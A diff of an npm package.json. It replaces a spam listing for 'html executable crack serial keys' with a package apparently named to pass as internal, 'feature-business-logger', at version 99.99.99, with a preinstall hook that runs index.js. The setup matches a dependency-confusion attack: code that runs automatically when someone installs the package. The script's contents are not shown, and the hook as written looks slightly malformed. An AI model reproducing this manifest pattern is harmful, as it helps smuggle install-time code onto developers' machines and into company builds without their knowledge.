@@ -1,14 +1,12 @@
 {
-  "name": "html_executable_crack_better_serial_keys_asf4",
-  "version": "1.0.0",
-  "description": "html executable crack !!better!! serial keys",
-  "main": "",
+  "name": "feature-business-logger",
+  "version": "99.99.99",
+  "description": "",
+  "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1"
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "index.js"
   },
-  "keywords": [
-    "html executable crack !!better!! serial keys"
-  ],
-  "author": "",
+  "author": "Ritik",
   "license": "ISC"
 }
